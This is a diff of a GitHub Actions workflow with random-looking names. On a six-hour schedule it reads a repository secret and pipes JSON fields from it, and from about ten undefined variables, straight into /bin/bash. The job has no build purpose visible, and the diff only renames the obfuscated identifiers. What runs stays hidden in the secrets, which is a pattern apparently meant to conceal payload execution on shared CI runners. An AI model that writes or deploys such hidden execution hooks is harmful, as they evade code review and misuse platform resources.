@@ -1,30 +1,26 @@
 name: duanxiaojh
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 4/6 * * *'
-jobs:  # 29051
+    - cron: '59 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duanxiaojh
         env:
-          o8: ${{ secrets.o8 }}
+          q09: ${{ secrets.q09 }}
         run: |
-          echo $o8 | jq -r .xnmsa2 | /bin/bash
-          echo $avgw93 | jq -r .vukt011 | /bin/bash
-          echo $av21448 | jq -r .zvkip08 | /bin/bash
-          echo $qg731 | jq -r .t1062 | /bin/bash
-          echo $yf22278 | jq -r .eyo3 | /bin/bash
-          echo $cj3678 | jq -r .zvyk16716 | /bin/bash
-          echo $jeg56 | jq -r .drr7742 | /bin/bash
-          echo $wtn50 | jq -r .n40287 | /bin/bash
-          echo $xjdno043 | jq -r .fkjd0158 | /bin/bash
-          echo $flu4808 | jq -r .tlkmf8033 | /bin/bash
-          echo $g6 | jq -r .pic4252 | /bin/bash
-          echo $x8135 | jq -r .s7813 | /bin/bash
-          echo $yvel886 | jq -r .xmp3202 | /bin/bash
-          echo $lbgkg14 | jq -r .oqnt5 | /bin/bash
+          echo $q09 | jq -r .uqxq07 | /bin/bash
+          echo $ybfwp60723 | jq -r .ee641 | /bin/bash
+          echo $h85348 | jq -r .ft71763 | /bin/bash
+          echo $fqfb7 | jq -r .u6118 | /bin/bash
+          echo $dro7 | jq -r .eetv18481 | /bin/bash
+          echo $rvpa64 | jq -r .zse69445 | /bin/bash
+          echo $zmvbh205 | jq -r .hvx4 | /bin/bash
+          echo $h4 | jq -r .xm373 | /bin/bash
+          echo $yrje33763 | jq -r .sdhy4 | /bin/bash
+          echo $wc97472 | jq -r .w280 | /bin/bash
 
